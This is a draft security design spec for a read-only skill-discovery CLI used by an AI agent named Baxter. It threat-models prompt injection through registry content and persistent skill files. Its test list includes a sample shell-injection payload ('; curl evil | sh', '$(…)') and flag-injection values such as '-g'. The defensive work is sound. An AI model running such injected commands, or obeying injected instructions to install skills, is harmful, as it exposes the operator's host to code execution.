# skills-cli — read-only discovery into the open agent-skills ecosystem

**Status:** draft spec v3 (not implemented — v1+v2 reviews folded in; awaiting TDD review + operator sign-off)
**Date:** 2026-07-21

## Goal

Let Baxter **discover** skills from the open agent-skills ecosystem (`npx skills` /
[skills.sh](https://skills.sh), by vercel-labs) and **hand the operator what they
need to decide**, while the decision to actually **install** a skill stays a human,
curated, host-side action. No autonomous install, no new code-execution surface.

Trust model: "Discover + suggest (curated)". Refinement (operator, 2026-07-21):
for a match from a **non-trusted** owner, Baxter does not recommend it — he prints
the exact `npx skills add …` command for the operator to run at their own judgment.

## Why not the ecosystem's own flow

`find-skills` tells the agent to run `npx skills add <owner/repo@skill> -g -y` —
install globally, **skip confirmation**, any public GitHub repo. Two conflicts with
Baxter's model, sharp because **Baxter's inputs are attacker-influenced**:

1. **`npx` executes code** (arbitrary npm package + network). Baxter has no
   arbitrary execution — an execFile allowlist (no shell) and an offline
   (`network:none`) code sandbox.
2. **Installing a skill injects untrusted markdown into context.** Baxter's skills
   are *baked* (trusted, in the image) or *learned* (self-authored, staged by the
   trusted daemon with shadow-guards). An arbitrary third-party `SKILL.md`,
   installed unconfirmed from attacker-influenced input, is a persistent injection.

So we take only the **read half** (discovery) as a scoped CLI mirroring `data-cli`,
and leave the **write half** (install) to the operator.

## Design

### `skills-cli` (new scoped CLI — `app/scripts/skills-cli.mjs`)

Read-only gateway to the registry search API, `data-cli`/`web-cli` family.
**Surface is `find` only** — no `add`/`install`/`remove`/`use`/`sync`.

```
skills-cli find <query> [--owner <owner>] [--limit <n>]
```

- `GET https://skills.sh/api/search?q=<query>&limit=<n>[&owner=<owner>]` — the exact
  endpoint `npx skills find` uses (confirmed from vercel-labs/skills `src/find.ts`).
- **Host-locked** like `data-cli`, and structurally stronger: the path is a fixed
  `/api/search` and the run supplies only query **values** (`q`, `owner`, `limit`)
  via `URLSearchParams`, so there is no path-suffix surface at all. `buildSearchUrl`
  can't produce an off-origin URL; exported `assertConfined` (origin === base
  origin AND path === `/api/search`) is belt-and-suspenders and independently
  testable. Fast-fail hygiene rejects control chars / oversized query values.
- `--limit` is clamped to a ceiling (default 10, max 25) and rejects non-numeric /
  negative values — the byte cap shouldn't be the only bound.
- **Read-only, keyless.** Public search; no API key handled. GET only; a non-2xx or
  non-JSON body yields a clean error result, not a throw.
- **Response** (the CLI's shape): each hit `{ id, name, installs, source }`, mapped
  to `{ slug, name, installs, owner, repo, url, installCommand, trusted, sourceRaw? }`.
  **Every field the operator or Baxter acts on is composed in the CLI from a
  strict, validated parse — never naive string interpolation of registry content**
  (`source` and `id` are attacker-influenced). Two conservative ASCII validators,
  each of which actually embodies its claims (no `.`/`..`-only segment, no leading
  `-`/flag-shape, no `/ @ : ? # %` or control chars, explicit length cap):
  - `OWNER = /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$/` — a GitHub owner:
    alphanumerics + internal hyphens only, must start **and** end alphanumeric (so
    `--registry`, or any leading/trailing `-`, is rejected → no flag-shaped first
    arg in the pasted `npx skills add …`), ≤39 chars, no `.`/`_` (GitHub owners
    can't contain them).
  - `SEG = /^(?!\.+$)[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/` — repo + slug: first char
    alphanumeric (kills a leading `-`), never a dot-only segment (`.`/`..` → the
    `github.com/../..` root-escape is rejected), ≤64 chars.
  - `owner`/`repo` — from `source` split on `/`, only when `source` is exactly two
    segments with `owner` matching `OWNER` and `repo` matching `SEG`; else both null.
  - `slug` — the registry `id`, only when it matches `SEG`; else null.
  - `url` — constructed `https://github.com/<owner>/<repo>` **only** when
    `owner`/`repo` are set (per above); else null. `url` is the field whose purpose
    is to be clicked by a human, so it must never be a naive concatenation. (TDD.)
  - `installCommand` — the exact `npx skills add <owner>/<repo>@<slug>` string,
    emitted **only** when `owner`, `repo`, AND `slug` all validated; else null. This
    string may be pasted into the operator's host shell, so composing it from
    validated parts in the CLI (not by Baxter from raw fields) is the whole point —
    a slug/name like `; curl evil | sh` / backticks / `$(…)` must never reach a
    printed command. (TDD.) When any part fails validation, the CLI emits
    `sourceRaw` (the raw `source`/`id`, clearly labeled unverified) and **no**
    `installCommand` — Baxter then prints no command (see the skill).
  - `trusted` — boolean: `owner` (validated) matches the trusted-owner allowlist by
    **exact case-insensitive ASCII** compare (GitHub owners are case-insensitive, so
    `Vercel-Labs` matches; any non-exact/lookalike variant — `verceI-labs`,
    `vercel-labs-x` — does not). Allowlist: **only orgs verified vendor-controlled at
    inclusion time** — `vercel-labs`, `vercel`, `anthropics`, `microsoft`.
    (Deliberately **not** `anthropic` singular: Anthropic's org is `anthropics`; a
    squatter on `anthropic` would otherwise invert the strong signal.)
    Operator-extensible via env; the env value is validated the same way.
  - **Not sorted by installs.** Ordering is: trusted-owner first, then registry
    order; `installs` is a returned field but a *weak* signal (see below). Output is
    **untrusted content** (treat like `web-cli`): capped with a truncation marker,
    time-boxed by one `AbortController` over fetch + body read, metadata only —
    never a skill's `SKILL.md` body. Emitted via `JSON.stringify`, so a `name`
    containing newlines can't forge a sibling field (e.g. a fake `"trusted": true`)
    in the run's context. (TDD.)
- Registry base overridable **by the operator** via `SKILLS_REGISTRY_BASE` (default
  `https://skills.sh`), **not by the run**:
  - claude harness: an env-prefixed invocation (`SKILLS_REGISTRY_BASE=… skills-cli
    …`) doesn't match the `Bash(skills-cli *)` allow-rule, so it's denied;
  - openrouter/local: `run_cli` is an execFile allowlist with no shell — there is
    no env-prefix form.
  - The override is **validated at startup** exactly like the recent
    `GMAIL_OAUTH_REDIRECT_BASE` hardening (commits 9dfb357/7caa893/7dfc0bf): parse
    with `new URL`, require http(s) + host + no path/query/userinfo, build from the
    parsed origin (not the raw string), reject junk loudly. (TDD target.)

### The `skill-discovery` skill (`app/skills/skill-discovery/SKILL.md`)

(Named `skill-discovery`, not `skills`, to avoid a `skills`/`skills-cli` readability
wart.) Adapts `find-skills` to the curated model. It tells Baxter:

- The ecosystem exists; search with `skills-cli find <query>` → metadata JSON.
- **Trust tiers drive behavior:**
  - **Trusted owner** (`trusted: true`) with reasonable adoption → Baxter may
    *recommend* it: surface `name`, `owner/repo` **verbatim**, install count, the
    `url`, and a one-line why, and offer to have the operator add it — printing the
    CLI's `installCommand` field **verbatim** (never composing the command himself
    from parts).
  - **Non-trusted owner** → Baxter does **not** endorse it. He prints the
    `installCommand` field verbatim and says it's from an unverified owner, the
    operator's call — nothing more. (Operator refinement.)
  - **`installCommand` is null** (the CLI couldn't safely parse owner/repo/slug) →
    Baxter prints **no** command; he notes the entry couldn't be safely referenced
    and points the operator at skills.sh to look it up. Baxter must **never** build a
    `npx skills add …` string from raw fields — only echo the CLI's validated one.
- **Install counts are self-reported, unauthenticated telemetry — not
  Sybil-resistant.** Treat as a weak tiebreaker, never a trust signal; an attacker
  can inflate a count and squat a lookalike owner (`vercel-labs` vs `verceI-labs`),
  so **always show the exact owner/repo string** so lookalikes are visible. The
  strong signal is the trusted-owner allowlist; installs are the weak one.
- **Hard prohibition (closes the bypass in Security §1):** never `web-cli`/`WebFetch`
  an ecosystem skill's `SKILL.md`, and never copy/adapt ecosystem skill *content*
  into `learned-skills/` (or anywhere in the workspace). Discovery is metadata +
  a command for the operator, full stop. Baxter authors learned skills from his own
  reasoning, not by transcribing third-party skill files.

### Operator-curated install (host-side)

When the operator approves, they run `npx skills add <owner/repo@skill>` on the host
and **bake it**: land the vetted `SKILL.md` in `app/skills/<name>/`, wire it into the
surfaces' `SKILL_SRCS` in `grants.mjs`, commit, rebuild.

**Baked is the only landing spot for third-party skills (open Q1 resolved).** The
alternative — dropping it into the config volume's `learned-skills/` — is rejected:
`learned-skills/` is **run-writable and sync-staged**, so a later prompt-injected run
could silently edit or replace the "vetted" skill; the vetting wouldn't persist past
the next hostile run. Baked (in git, in `BAKED_SKILL_NAMES`, shadow-guarded) is the
only tier where "vetted" stays true. A `make add-skill REPO=… SKILL=…` convenience
for the baked path is a fast-follow, not blocking v1 (v1 documents the manual steps).

### Wiring

- `Bash(skills-cli *)` in `CORE_TOOLS` (`grants.mjs`) — read-only, harmless on every
  surface (voice-dispatch reuses `DISCORD_TOOLS`/`DISCORD_SKILL_SRCS`, so it's
  covered automatically).
- `skill-discovery` in each surface's `SKILL_SRCS` → auto-derives into
  `BAKED_SKILL_NAMES` (`grants.mjs`), so a learned skill can't shadow it.
- Dockerfile PATH shim for `skills-cli`.
- Brief capability bullet in the discord/email/heartbeat prompts + voice inline.

## Security posture (honest)

- **`skills-cli` adds no install *capability*.** It has no write/install verb. But
  this is NOT "the run cannot install a skill": the run already has web fetch +
  unscoped `Write` into its cwd (which contains `LEARNED_SKILLS_DIR`), and
  `ensureSkills` stages `learned-skills/*` into `.claude/skills` next run. So a
  prompt-injected run could fetch a third-party `SKILL.md` and transcribe it into a
  learned skill **without any install verb** — a path that *pre-exists* this
  feature (Baxter could always copy a web page into a learned skill). What this
  feature adds is **curated pointers to installable skill files**, i.e. the exact
  funnel an injected "find and set up the X skill" instruction would use. Gates:
  1. **discovery output is metadata-only** — no `SKILL.md` body enters context via
     `skills-cli`, so the *content* an injected run would transcribe still has to be
     fetched by a separate, visible `web-cli`/`WebFetch` call it must be talked into;
  2. **the skill explicitly prohibits** fetching/transcribing ecosystem skill
     content into the workspace (prompt-level — the honest tier for this residual,
     matching the repo's guardrail philosophy);
  3. **the operator can audit** — `learned-skills/` is the source of truth and
     sync-staged, so a rogue skill is one delete away; **and** (declined for v1, but
     named here for sign-off) the daemon could log newly-appeared learned-skill
     names so the operator sees them in `make logs`. Spec recommends deferring the
     daemon log to a fast-follow unless the operator wants it in v1.
- **No new code-exec.** No `npx`, no shell — a host-locked HTTP GET, same class as
  `web-cli`/`data-cli`.
- **Host-locked + encoded**, no path-suffix surface, no SSRF via the query. The
  query-as-exfil concern is moot: the run already reaches arbitrary URLs (same
  argument the repo makes for `WebFetch`), so a search query to a fixed host adds no
  exfil channel.
- **`url` is validated** from the attacker-influenced `source`, never naive concat.
- **Operator override validated** at startup (gmail-auth precedent).
- **Metadata residual:** names/owners are attacker-influenced text Baxter reads and
  may relay — same class as any `web-cli` fetch, already accepted; it can't act on
  its own (no install path in `skills-cli`).
- **Printed-command framing residual:** the `installCommand` string itself is
  *code-validated* (safe to paste), but the "no endorsement / your call" framing
  around it for a non-trusted owner is *prompt-level* — a prompt-injected run could
  wrap a validated command in persuasive text to push the operator to run it. This
  is an operator-accepted policy call (the operator requested the print behavior);
  the code guarantee is only that the command string can't be a shell-injection, not
  that Baxter's surrounding prose is trustworthy. The operator vets the repo (`url`)
  before running, as with any suggestion.
- **Install trust persists only when baked** (Q1) — never demote a vetted
  third-party skill to the run-writable `learned-skills/` tier.

## TDD targets (tests written + reviewed before implementation)

Pure, security-critical, mirroring `data-cli.test.mjs`:

1. `buildSearchUrl({query, owner, limit})` — host-locked URL, `URLSearchParams`
   encoding; a query with `&`/`#`/`?`/spaces/unicode goes into `q`, not host/path/
   other params.
2. `assertConfined(url)` — origin always the registry base, path always
   `/api/search`; a crafted query can't move origin/path; a non-registry origin
   rejects (tested via the export, since the builder can't reach it).
3. `formatResults(json)` — maps `{id,name,installs,source}` → the enriched row;
   ordering is trusted-first (not installs-sorted); tolerates missing/malformed
   fields; caps output. Trusted-owner matching is **exact case-insensitive ASCII**:
   `Vercel-Labs` → trusted; `verceI-labs` (lookalike/unicode), `anthropic` (not the
   real org), `vercel-labs-x` → NOT trusted. Emitted via `JSON.stringify`, so a
   `name` with newlines can't forge a sibling field (a fake `"trusted": true`).
4. **`url` + `installCommand` derivation safety (NEW-1)** — malicious/odd `source`
   or `id` never yields a constructed `github.com` `url` NOR an `installCommand`
   (both fall back to null with `sourceRaw` labeled unverified); only a clean
   `owner`/`repo` **and** clean slug yields them. Malicious-input list must include:
   extra segments (`a/b/c`), `@`/`?`/`#`, shell metacharacters (`; | & \` $( )`),
   spaces, unicode, empty, **`.`/`..`/`../..` (path-shaped root-escape)**,
   **leading-dash (`-g`, `--yes` — *argument* injection into `npx skills add`; e.g.
   `-g` is the CLI's global-install flag; distinct from shell injection)**, and
   **over-length** (owner >39, repo/slug >64). The printed command must be shell-
   **and** argument-injection-safe by construction.
5. **Read-only surface + unknown-flag/verb rejection** — dispatch exposes only
   `find`; an `add`/`install`/unknown verb errors; an unknown `--flag` errors
   loudly (data-cli precedent) so a stray flag can't swallow a value or a future
   `--base` can't sneak in.
6. **`--limit` clamp** — clamps to the ceiling; rejects non-numeric/negative.
7. **`SKILLS_REGISTRY_BASE` validation** — garbage/non-https/path-bearing base
   rejected loudly; built from parsed origin (matches the `GMAIL_OAUTH_REDIRECT_BASE`
   tests).
8. Response cap + truncation marker; non-2xx / non-JSON body → clean error result.
9. **`grants.test.mjs`** gains: `skill-discovery` ∈ `BAKED_SKILL_NAMES` on every
   surface, and `Bash(skills-cli *)` in `CORE_TOOLS`.

Live/integration (post-approval, not unit): one real `skills-cli find` against
skills.sh to confirm the endpoint + shape.

## Open questions for the operator

1. **Daemon-side visibility of new learned skills** (the one residual from Security
   §1 that's an operator policy call): v1 relies on the skill's prohibition +
   audit-by-delete; do you want the daemon to also log newly-appeared
   `learned-skills/` names so they show up in `make logs`? (Lean: fast-follow, not
   v1.)
2. **Trusted-owner allowlist contents** — set to verified-vendor orgs
   `vercel-labs`, `vercel`, `anthropics`, `microsoft` (dropped `anthropic` singular
   as unverified/squattable — Anthropic's org is `anthropics`). Confirm this set and
   that each is the real vendor org before ship; any to add? Env-extensible, and the
   env value is validated the same way.
3. **`make add-skill` convenience** for the baked install path — v1 (documented
   manual steps) or fast-follow? (Lean: fast-follow.)

## Resolved (from spec review v1)
- Landing spot: **baked only** for third-party skills (trust asymmetry).
- `--limit`: **clamp** (default 10, max 25).
- Registry base: **const default + operator-only env override, validated** at
  startup.
- Installs downgraded to a **weak, non-trust** signal; trusted-owner allowlist is the
  strong signal; ordering is trusted-first, not installs-sorted.
